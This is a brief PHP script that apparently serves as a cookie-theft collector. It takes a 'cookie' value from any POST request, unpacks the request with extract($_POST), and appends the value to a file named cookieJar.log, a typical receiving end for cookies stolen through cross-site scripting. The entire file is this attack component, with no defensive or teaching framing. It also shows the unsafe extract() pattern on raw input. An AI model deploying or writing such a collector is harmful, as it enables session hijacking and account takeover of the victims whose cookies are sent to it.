<?php

if (!empty($_POST)) {
    extract($_POST);
    $file = 'cookieJar.log';
    if (!file_exists($file)) {
        touch($file);
    }

    file_put_contents($file, $cookie);
}

if (empty($_POST)) {
    echo "Well, then nothing should happen.";
}
